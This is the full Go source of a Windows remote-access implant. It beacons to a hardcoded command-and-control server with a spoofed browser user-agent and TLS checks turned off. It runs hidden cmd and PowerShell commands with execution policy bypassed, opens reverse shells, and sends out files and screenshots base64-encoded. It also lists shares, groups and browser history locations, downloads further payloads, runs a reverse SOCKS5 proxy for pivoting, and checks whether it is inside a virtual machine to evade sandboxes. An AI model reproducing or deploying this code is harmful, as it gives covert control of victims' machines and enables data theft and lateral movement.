package main

import (
        "bufio"
        "bytes"
        "context"
        "crypto/rand"
        "crypto/tls"
        "encoding/base64"
        "encoding/binary"
        "encoding/hex"
        "encoding/json"
        "fmt"
        "github.com/StackExchange/wmi"
        "github.com/kbinani/screenshot"
        "image/png"
        "io"
        "io/ioutil"
        "log"
        mrand "math/rand"
        "net"
        "net/http"
        "net/url"
        "os"
        "os/exec"
        "os/user"
        "path/filepath"
        "strings"
        "sync"
        "syscall"
        "time"
        "unicode"
)

var (
        proxyLock     = &sync.Mutex{}
        proxyActive   = false
        proxyStopChan chan struct{}
)

var (
        proxyCtx      context.Context
        proxyCancel   context.CancelFunc
        agentID       string
)

var (
        serverURL   = "http://192.168.56.101:5000"
        bearerToken = "Azerty112345678"
)

var (
        beaconMin            = 10
        beaconMax            = 30
        userAgent            = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
        tlsInsecureSkipVerify = true
)

type Command struct {
        ID  string `json:"id"`
        Cmd string `json:"cmd"`
}

type CommandResult struct {
        ID       string `json:"id"`
        Result   string `json:"result"`
        FileName string `json:"fileName,omitempty"`
}

func main() {
        log.Println("Agent started. Waiting for commands...")
        agentID = getAgentID()
        log.Printf("[*] Generated ephemeral Agent ID: %s", agentID)

        go startBeaconLoop()

        select {}
}

func startBeaconLoop() {
        mrand.Seed(time.Now().UnixNano())
        for {
                interval := mrand.Intn(beaconMax-beaconMin+1) + beaconMin
                time.Sleep(time.Duration(interval) * time.Second)

                cmd, err := fetchCommand(agentID)
                if err != nil {
                        log.Printf("Error fetching command: %v", err)
                        continue
                }
                if cmd.ID != "" {
                        log.Printf("[*] Dispatching command ID: %s → %s", cmd.ID, cmd.Cmd)
                        go executeCommandAndSendResult(cmd)
                }
        }
}

func fetchCommand(agentID string) (Command, error) {
        var cmd Command

        req, err := http.NewRequest("GET", fmt.Sprintf("%s/command", serverURL), nil)
        if err != nil {
                return cmd, err
        }

        req.Header.Set("Authorization", "Bearer "+bearerToken)
        req.Header.Set("X-Agent-ID", agentID)
        req.Header.Set("User-Agent", userAgent)

        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: tlsInsecureSkipVerify},
        }
        client := &http.Client{
                Transport: tr,
                Timeout:   15 * time.Second,
        }
        resp, err := client.Do(req)
        if err != nil {
                return cmd, err
        }
        defer resp.Body.Close()

        if resp.StatusCode != http.StatusOK {
                return cmd, nil
        }

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return cmd, err
        }

        if err := json.Unmarshal(body, &cmd); err != nil {
                return cmd, err
        }

        return cmd, nil
}

func sendResult(result CommandResult) {
        jsonData, err := json.Marshal(result)
        if err != nil {
                log.Printf("Error marshalling result: %v", err)
                return
        }

        req, err := http.NewRequest("POST", fmt.Sprintf("%s/submit_result", serverURL), bytes.NewBuffer(jsonData))
        if err != nil {
                log.Printf("Failed to create HTTP request: %v", err)
                return
        }

        req.Header.Set("Authorization", "Bearer "+bearerToken)
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("X-Agent-ID", agentID)
        req.Header.Set("User-Agent", userAgent)

        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: tlsInsecureSkipVerify},
        }
        client := &http.Client{
                Transport: tr,
                Timeout:   15 * time.Second,
        }
        resp, err := client.Do(req)
        if err != nil {
                log.Printf("Failed to send result: %v", err)
                return
        }
        defer resp.Body.Close()
}

func executeCommandAndSendResult(cmd Command) {
        switch {
        case strings.HasPrefix(cmd.Cmd, "shell "):
                go Shell(strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell")))
        case strings.HasPrefix(cmd.Cmd, "download "):
                tokens := strings.Split(cmd.Cmd, " ")
                if len(tokens) < 3 {
                        sendResult(CommandResult{ID: cmd.ID, Result: "[-] Usage: download <source_path> <destination_name>"})
                        return
                }
                srcPath := strings.Join(tokens[1:len(tokens)-1], " ")
                dstName := tokens[len(tokens)-1]
                downloadFile(srcPath, dstName, cmd.ID)
        case cmd.Cmd == "screenshot":
                takeScreenshot(cmd)
        case cmd.Cmd == "list_share":
                listShare(cmd)
        case cmd.Cmd == "list_drive":
                listDrive(cmd)
        case cmd.Cmd == "whoami":
                whoami(cmd)
        case cmd.Cmd == "list_group":
                listGroup(cmd)
        case cmd.Cmd == "scheduled_task":
                listScheduledTask(cmd)
        case cmd.Cmd == "publicip":
                publicIp(cmd)
        case cmd.Cmd == "powershell":
                execPowerShellAndSendResult(cmd)
        case strings.HasPrefix(cmd.Cmd, "run_script "):
                scriptPath := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "run_script"))
                runPowerShellScript(cmd, scriptPath)
        case strings.HasPrefix(cmd.Cmd, "fetchfile "):
                parts := strings.SplitN(cmd.Cmd[len("fetchfile "):], " ", 2)
                if len(parts) == 2 {
                        fetchRemoteFile(parts[0], parts[1], cmd.ID)
                } else {
                        sendResult(CommandResult{ID: cmd.ID, Result: "Usage: fetchfile <url> <destination_path>"})
                }
        case cmd.Cmd == "browser_history":
                checkBrowserHistories(cmd)
        case cmd.Cmd == "reverse_proxy_start":
                go startReverseProxy()
                sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy started."})
        case cmd.Cmd == "reverse_proxy_stop":
                stopReverseProxy()
                sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy stop signal sent."})
        case strings.HasPrefix(cmd.Cmd, "beacon "):
                updateBeaconInterval(cmd)
        default:
                executeOtherCommand(cmd)
        }
}

func Shell(address string) {
        conn, err := net.Dial("tcp", address)
        if err != nil {
                log.Printf("Failed to shell to %s: %v", address, err)
                return
        }
        defer conn.Close()

        for {
                reader := bufio.NewReader(conn)
                command, err := reader.ReadString('\n')
                if err != nil {
                        log.Printf("Failed to read command: %v", err)
                        break
                }

                cmd := exec.Command("cmd.exe", "/C", command)
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                output, err := cmd.CombinedOutput()
                if err != nil {
                        fmt.Fprintf(conn, "Failed to execute command: %s\n", err)
                        continue
                }

                conn.Write(output)
        }
}

func downloadFile(filePath, fileName, commandID string) {
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
                log.Printf("Error reading file %s: %v", filePath, err)
                sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("Failed to read file: %v", err)})
                return
        }
        encodedContent := base64.StdEncoding.EncodeToString(content)
        sendResult(CommandResult{ID: commandID, Result: encodedContent, FileName: fileName})
}

func takeScreenshot(cmd Command) {
        bounds := screenshot.GetDisplayBounds(0)
        img, err := screenshot.CaptureRect(bounds)
        if err != nil {
                sendResult(CommandResult{ID: cmd.ID, Result: "Failed to take screenshot"})
                return
        }
        var buf bytes.Buffer
        if err := png.Encode(&buf, img); err != nil {
                return
        }
        timestamp := time.Now().Format("20060102-150405")
        fileName := fmt.Sprintf("screenshot-%s.png", timestamp)
        sendResult(CommandResult{
                ID:       cmd.ID,
                Result:   base64.StdEncoding.EncodeToString(buf.Bytes()),
                FileName: fileName,
        })
}

func listShare(cmd Command) {
        psCommand := "powershell.exe Get-WmiObject Win32_Share"
        output, err := exec.Command("cmd", "/C", psCommand).CombinedOutput()
        resultText := string(output)
        if err != nil {
                resultText += "\nError: " + err.Error()
        }
        sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}

func listDrive(cmd Command) {
        output, err := exec.Command("cmd", "/C", "wmic logicaldisk get name,size").CombinedOutput()
        resultText := string(output)
        if err != nil {
                resultText += "\nError: " + err.Error()
        }
        sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}

func whoami(cmd Command) {
        output, err := exec.Command("cmd", "/C", "whoami /all").CombinedOutput()
        resultText := string(output)
        if err != nil {
                resultText += "\nError: " + err.Error()
        }
        sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}

func listGroup(cmd Command) {
        output, err := exec.Command("cmd", "/C", "net localgroup").CombinedOutput()
        resultText := string(output)
        if err != nil {
                resultText += "\nError: " + err.Error()
        }
        sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}

func listScheduledTask(cmd Command) {
        output, err := exec.Command("cmd", "/C", "schtasks /query /fo LIST /v").CombinedOutput()
        resultText := string(output)
        if err != nil {
                resultText += "\nError: " + err.Error()
        }
        sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}

func publicIp(cmd Command) {
        req, err := http.NewRequest("GET", "https://ipinfo.io/ip", nil)
        if err != nil {
                sendResult(CommandResult{ID: cmd.ID, Result: fmt.Sprintf("Error creating request: %v", err)})
                return
        }
        req.Header.Set("User-Agent", userAgent)

        client := &http.Client{Timeout: 5 * time.Second}
        resp, err := client.Do(req)
        if err != nil {
                sendResult(CommandResult{ID: cmd.ID, Result: fmt.Sprintf("Error fetching public IP: %v", err)})
                return
        }
        defer resp.Body.Close()

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                sendResult(CommandResult{ID: cmd.ID, Result: fmt.Sprintf("Error reading response: %v", err)})
                return
        }

        publicIP := strings.TrimSpace(string(body))
        sendResult(CommandResult{ID: cmd.ID, Result: publicIP})
}

func runPowerShellScript(cmd Command, scriptPath string) {
        command := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
        command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

        output, err := command.CombinedOutput()
        resultText := string(output)
        if err != nil {
                resultText += "\nError: " + err.Error()
        }
        sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}

func execPowerShellAndSendResult(cmd Command) {
        psCmd := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(cmd.Cmd), "powershell"))
        if psCmd == "" {
                psCmd = cmd.Cmd
        }

        command := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
        command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

        output, err := command.CombinedOutput()
        resultText := string(output)
        if err != nil {
                resultText += "\nError: " + err.Error()
        }
        sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}

func fetchRemoteFile(url, destPath string, commandID string) {
        resp, err := http.Get(url)
        if err != nil {
                sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("❌ Failed to fetch %s: %v", url, err)})
                return
        }
        defer resp.Body.Close()

        if resp.StatusCode != http.StatusOK {
                sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("❌ Server returned: %s", resp.Status)})
                return
        }

        file, err := os.Create(destPath)
        if err != nil {
                sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("❌ Failed to create %s: %v", destPath, err)})
                return
        }
        defer file.Close()

        _, err = io.Copy(file, resp.Body)
        if err != nil {
                sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("❌ Failed to save file: %v", err)})
                return
        }

        sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("✅ File successfully fetched to %s", destPath)})
}

func checkBrowserHistories(cmd Command) {
        browsers := []struct {
                Name         string
                PathPatterns []string
        }{
                {"Chrome", []string{`AppData\Local\Google\Chrome\User Data\Default\History`}},
                {"Edge", []string{`AppData\Local\Microsoft\Edge\User Data\Default\History`}},
                {"Brave", []string{`AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History`}},
                {"Firefox", []string{`AppData\Roaming\Mozilla\Firefox\Profiles`}},
        }

        currentUser, err := user.Current()
        if err != nil {
                sendResult(CommandResult{ID: cmd.ID, Result: "Failed to get current user: " + err.Error()})
                return
        }

        var resultBuilder strings.Builder
        for _, browser := range browsers {
                found := false
                if browser.Name == "Firefox" {
                        basePath := filepath.Join(currentUser.HomeDir, browser.PathPatterns[0])
                        files, err := os.ReadDir(basePath)
                        if err == nil {
                                for _, f := range files {
                                        if f.IsDir() && strings.Contains(f.Name(), ".default") {
                                                histPath := filepath.Join(basePath, f.Name(), "places.sqlite")
                                                if _, err := os.Stat(histPath); err == nil {
                                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
                                                        found = true
                                                        break
                                                }
                                        }
                                }
                        }
                } else {
                        for _, pattern := range browser.PathPatterns {
                                histPath := filepath.Join(currentUser.HomeDir, pattern)
                                if _, err := os.Stat(histPath); err == nil {
                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
                                        found = true
                                        break
                                }
                        }
                }
                if !found {
                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: No or History Not Found\n---\n", browser.Name))
                }
        }

        sendResult(CommandResult{ID: cmd.ID, Result: resultBuilder.String()})
}

func executeOtherCommand(cmd Command) {
    output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}

type VMCheckResult struct {
        HypervisorBit bool `json:"hypervisor_bit"`
        BIOSVendorMatch bool `json:"bios_vendor_match"`
        MACOUI bool `json:"mac_oui"`
        TimingAnomaly bool `json:"timing_anomaly"`
        RegistryArtifacts bool `json:"registry_artifacts"`
        LikelyVM bool `json:"likely_vm"`
}



func DetectVM() VMCheckResult {
        res := VMCheckResult{}
        res.HypervisorBit = false // not implemented
        res.BIOSVendorMatch = checkDmiStringsWMI()
        res.MACOUI = checkMACVendor()
        res.TimingAnomaly = checkTimingAnomaly()
        res.RegistryArtifacts = false


        count := 0
        if res.HypervisorBit {
                count++
        }
        if res.BIOSVendorMatch {
                count++
        }
        if res.MACOUI {
                count++
        }
        if res.TimingAnomaly {
                count++
        }
        if res.RegistryArtifacts {
                count++
        }


        res.LikelyVM = count >= 2
        return res
}

func checkDmiStringsWMI() bool {
        type Win32_ComputerSystem struct {
                Manufacturer string
                Model        string
        }

        var sysInfo []Win32_ComputerSystem
        err := wmi.Query("SELECT Manufacturer, Model FROM Win32_ComputerSystem", &sysInfo)
        if err != nil || len(sysInfo) == 0 {
                return false
        }

        known := []string{"VMware", "VirtualBox", "Xen", "QEMU", "Microsoft", "KVM"}
        man := strings.ToLower(sysInfo[0].Manufacturer)
        model := strings.ToLower(sysInfo[0].Model)
        for _, k := range known {
                if strings.Contains(man, strings.ToLower(k)) || strings.Contains(model, strings.ToLower(k)) {
                        return true
                }
        }
        return false
}

func checkMACVendor() bool {
        vmOuis := []string{
                "00:05:69", "00:0C:29", "00:50:56", "08:00:27", "52:54:00",
        }
        ifaces, err := net.Interfaces()
        if err != nil {
                return false
        }
        for _, iface := range ifaces {
                mac := iface.HardwareAddr.String()
                for _, prefix := range vmOuis {
                        if strings.HasPrefix(strings.ToUpper(mac), strings.ToUpper(prefix)) {
                                return true
                        }
                }
        }
        return false
}

func checkTimingAnomaly() bool {
        start := time.Now()
        for i := 0; i < 1000000; i++ {
                _ = i * i
        }
        duration := time.Since(start)
        return duration > 80*time.Millisecond
}

func updateBeaconInterval(cmd Command) {
        args := strings.TrimPrefix(cmd.Cmd, "beacon ")
        parts := strings.Fields(args)
        var newMin, newMax int
        for _, p := range parts {
                if strings.HasPrefix(p, "min=") {
                        fmt.Sscanf(p, "min=%d", &newMin)
                } else if strings.HasPrefix(p, "max=") {
                        fmt.Sscanf(p, "max=%d", &newMax)
                }
        }

        if newMin <= 0 || newMax <= 0 || newMin >= newMax {
                sendResult(CommandResult{ID: cmd.ID, Result: "❌ Invalid beacon range. Use: beacon min=10 max=30 (min < max)"})
                return
        }

        beaconMin = newMin
        beaconMax = newMax
        sendResult(CommandResult{ID: cmd.ID, Result: fmt.Sprintf("✅ Beacon interval updated: min=%d, max=%d", beaconMin, beaconMax)})
}

// Updated agent-side code to handle one SOCKS5 session per connection.
// Each connection is initiated outbound from the agent to the listener (C2 server).
// The listener should demultiplex multiple SOCKS5 clients over the same connection or create one connection per SOCKS5 session.

func startReverseProxy() {
    if proxyCancel != nil {
        log.Println("[!] proxy already running")
        return
    }

    proxyCtx, proxyCancel = context.WithCancel(context.Background())

    for i := 0; i < 5; i++ {
        go proxyWorker(proxyCtx)
    }
}
func proxyWorker(ctx context.Context) {

    parsed, err := url.Parse(serverURL)
    if err != nil {
        log.Printf("[-] proxy: cannot parse serverURL: %v", err)
        return
    }

    host := parsed.Host
    if strings.Contains(host, ":") {
        host = strings.Split(host, ":")[0]
    }

    remoteAddr := net.JoinHostPort(host, "5555")

    log.Println("[+] proxy worker started")

    for {
        select {
        case <-ctx.Done():
            log.Println("[+] proxy worker stopped")
            return
        default:
        }

        log.Printf("[*] proxy: connecting to %s ...", remoteAddr)

        conn, err := net.DialTimeout("tcp", remoteAddr, 10*time.Second)
        if err != nil {

            select {
            case <-ctx.Done():
                return
            case <-time.After(5 * time.Second):
                continue
            }
        }

        log.Printf("[+] proxy: connected to %s", remoteAddr)

        connDone := make(chan struct{})
        go func() {
            select {
            case <-ctx.Done():
                conn.Close()
            case <-connDone:
            }
        }()

        handleSingleSOCKS5(conn)
        close(connDone)

        conn.Close()

        select {
        case <-ctx.Done():
            return
        case <-time.After(2 * time.Second):
        }
    }
}

// Updated to handle exactly ONE SOCKS5 handshake and data relay session
func handleSingleSOCKS5(serverConn net.Conn) {
    defer func() {
        _ = serverConn.Close()
        log.Printf("[*] SOCKS5: connection handler exiting")
    }()

    // helper to close write side when using net.TCPConn
    closeWrite := func(c net.Conn) {
        if tcp, ok := c.(*net.TCPConn); ok {
            _ = tcp.CloseWrite()
        } else {
            _ = c.Close()
        }
    }

    idleTimeout := 120 * time.Second
    _ = serverConn.SetReadDeadline(time.Now().Add(idleTimeout))
    header := make([]byte, 2)
    if _, err := io.ReadFull(serverConn, header); err != nil {
        log.Printf("[-] SOCKS5: greeting read failed: %v", err)
        return
    }
    _ = serverConn.SetReadDeadline(time.Time{})

    if header[0] != 0x05 {
        log.Printf("[-] SOCKS5: unsupported version %d", header[0])
        return
    }
    nMethods := int(header[1])
    if nMethods <= 0 || nMethods > 255 {
        log.Printf("[-] SOCKS5: invalid nMethods %d", nMethods)
        return
    }
    methods := make([]byte, nMethods)
    if _, err := io.ReadFull(serverConn, methods); err != nil {
        log.Printf("[-] SOCKS5: reading methods failed: %v", err)
        return
    }
    if _, err := serverConn.Write([]byte{0x05, 0x00}); err != nil {
        log.Printf("[-] SOCKS5: failed to write greeting reply: %v", err)
        return
    }

    headerReq := make([]byte, 4)
    if _, err := io.ReadFull(serverConn, headerReq); err != nil {
        log.Printf("[-] SOCKS5: request header read failed: %v", err)
        return
    }
    if headerReq[0] != 0x05 {
        log.Printf("[-] SOCKS5: request version mismatch %d", headerReq[0])
        return
    }
    cmd := headerReq[1]
    addrType := headerReq[3]
    if cmd != 0x01 {
        log.Printf("[-] SOCKS5: unsupported command %d", cmd)
        serverConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
        return
    }

    var dstHost string
    var dstPort uint16

    switch addrType {
    case 0x01:
        addrBuf := make([]byte, 4)
        if _, err := io.ReadFull(serverConn, addrBuf); err != nil {
            log.Printf("[-] SOCKS5: failed to read IPv4 addr: %v", err)
            return
        }
        portBuf := make([]byte, 2)
        if _, err := io.ReadFull(serverConn, portBuf); err != nil {
            log.Printf("[-] SOCKS5: failed to read port: %v", err)
            return
        }
        ip := net.IPv4(addrBuf[0], addrBuf[1], addrBuf[2], addrBuf[3]).String()
        dstHost = ip
        dstPort = binary.BigEndian.Uint16(portBuf)

    case 0x03:
        lenBuf := make([]byte, 1)
        if _, err := io.ReadFull(serverConn, lenBuf); err != nil {
            log.Printf("[-] SOCKS5: failed to read domain length: %v", err)
            return
        }
        dlen := int(lenBuf[0])
        domBuf := make([]byte, dlen+2)
        if _, err := io.ReadFull(serverConn, domBuf); err != nil {
            log.Printf("[-] SOCKS5: failed to read domain+port: %v", err)
            return
        }
        domain := string(domBuf[:dlen])
        port := binary.BigEndian.Uint16(domBuf[dlen:])

        ips, err := net.LookupIP(domain)
        if err != nil || len(ips) == 0 {
            log.Printf("[-] SOCKS5: DNS lookup failed for %s: %v", domain, err)
            serverConn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
            return
        }
        dstHost = ips[0].String()
        dstPort = port
        log.Printf("[*] SOCKS5: resolved %s -> %s", domain, dstHost)

    case 0x04:
        addrBuf := make([]byte, 16)
        if _, err := io.ReadFull(serverConn, addrBuf); err != nil {
            log.Printf("[-] SOCKS5: failed to read IPv6 addr: %v", err)
            return
        }
        portBuf := make([]byte, 2)
        if _, err := io.ReadFull(serverConn, portBuf); err != nil {
            log.Printf("[-] SOCKS5: failed to read port: %v", err)
            return
        }
        dstHost = net.IP(addrBuf).String()
        dstPort = binary.BigEndian.Uint16(portBuf)

    default:
        log.Printf("[-] SOCKS5: unsupported addrType %d", addrType)
        serverConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
        return
    }

    var dstAddr string
    if ip := net.ParseIP(dstHost); ip != nil && ip.To4() == nil {
        dstAddr = fmt.Sprintf("[%s]:%d", dstHost, dstPort)
    } else {
        dstAddr = fmt.Sprintf("%s:%d", dstHost, dstPort)
    }

    log.Printf("[*] SOCKS5 connect request → %s", dstAddr)
    targetConn, err := net.DialTimeout("tcp", dstAddr, 15*time.Second)
    if err != nil {
        log.Printf("[-] SOCKS5: connect to %s failed: %v", dstAddr, err)
        serverConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
        return
    }

    if _, err := serverConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}); err != nil {
        log.Printf("[-] SOCKS5: failed to write success reply: %v", err)
        targetConn.Close()
        return
    }
    log.Printf("[+] SOCKS5: connected → %s", dstAddr)

    done := make(chan struct{}, 2)
    go func() {
        _, _ = io.Copy(targetConn, serverConn)
        closeWrite(targetConn)
        done <- struct{}{}
    }()
    go func() {
        _, _ = io.Copy(serverConn, targetConn)
        closeWrite(serverConn)
        done <- struct{}{}
    }()
    <-done
    <-done
    log.Printf("[*] SOCKS5: session closed for %s", dstAddr)
}


func stopReverseProxy() {
    if proxyCancel == nil {
        log.Println("[-] proxy: not running.")
        return
    }

    log.Println("[*] proxy: stopping...")
    proxyCancel()
    proxyCancel = nil
    proxyCtx = nil
    log.Println("[+] proxy: stopped.")
}

func getAgentID() string {
        host, _ := os.Hostname()
        host = strings.Split(host, ".")[0]
        host = sanitizeHost(host)
        if len(host) > 15 {
                host = host[:15]
        }
        randBytes := make([]byte, 8)
        if _, err := rand.Read(randBytes); err != nil {
                return host
        }
        suffix := hex.EncodeToString(randBytes)
        return fmt.Sprintf("%s_%s", host, suffix)
}

func sanitizeHost(s string) string {
        var b strings.Builder
        for _, r := range s {
                if unicode.IsLetter(r) || unicode.IsDigit(r) || r == '-' || r == '_' {
                        b.WriteRune(unicode.ToLower(r))
                }
        }
        if b.Len() == 0 {
                return "host"
        }
        return b.String()
}

